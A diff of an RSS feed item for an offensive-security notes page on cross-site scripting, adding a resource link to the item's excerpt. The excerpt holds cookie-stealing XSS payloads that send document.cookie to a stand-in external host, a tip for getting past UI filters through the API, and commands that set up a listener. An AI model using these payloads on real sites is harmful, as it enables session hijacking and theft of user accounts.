@@ -16,10 +16,10 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/client-side-injections/xss/</guid>
-      <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot 
+      <description>Resources https://html5sec.org/ https://gbhackers.com/top-500-important-xss-cheat-sheet/ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot https://github.com/s0md3v/AwesomeXSS/ 
 Tips # If XSS is not executed through the UI, you can try to insert it through the API # It can then fire on the UI. Many filters are not present like this 
 Basic Stored XSS # Setup simple server python -m SimpleHTTPServer 8080 # Test wget -O- http://$(wget -qO- icanhazip.com):8080/lol # Exploit &amp;lt;script&amp;gt;document.location(&amp;#39;http://IP_EXTERNE/&amp;#39;+document.cookie)&amp;lt;/script&amp;gt; 
-Payloads # Document.location &amp;lt;script&amp;gt;document.location(&#39;http://IP_EXTERNE/&#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &#39;http://requestb.in/XXXXXX?cookies =&#39; + document.</description>
+Payloads # Document.location &amp;lt;script&amp;gt;document.location(&#39;http://IP_EXTERNE/&#39;+document.cookie)&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location.href = &#39;http://requestb.</description>
     </item>
     
     <item>
